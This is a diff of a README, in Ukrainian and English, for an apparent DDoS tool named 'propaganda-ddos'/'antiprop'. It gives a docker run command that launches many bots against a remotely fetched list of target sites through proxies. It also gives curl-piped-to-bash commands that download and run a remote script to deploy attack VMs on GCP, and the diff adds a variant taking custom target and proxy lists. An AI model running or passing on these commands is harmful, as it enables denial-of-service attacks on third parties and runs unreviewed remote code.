@@ -14,19 +14,25 @@
 ```bash
 docker run --restart=always --name=antiprop -d lovefromukraine/antiprop --refresh=69 \
 --dnsres=true --errcount=69 --onlyproxy=false --bots 69 --checkproxy=true \
---sites https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
---proxy https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
+https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/targets.json \
+https://raw.githubusercontent.com/meddion/propaganda-ddos/sources/proxy.json
 ```
+Щоб побачити логи
 ```bash
-# Щоб побачити логи
 docker logs antiprop -f
 ```
 
 
 ### Запуск в GCP VMs / Run in GCP VMs
+Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
 ```bash
-# Дивись файл micro_vms_gcp.sh / Look into micro_vms_gcp.sh
-curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 69
+curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 69 
+```
+Запуск із власними джерелами
+```bash
+curl https://raw.githubusercontent.com/meddion/propaganda-ddos/main/micro_vms_gcp.sh | bash -s 69 \
+<URL_TARGETS_JSON_ARRAY> \
+<URL_PROXY_JSON_ARRAY>
 ```
 ![image](https://user-images.githubusercontent.com/25509048/156889923-0a3bd42b-5ee0-466c-8e48-b8295cead812.png)
 
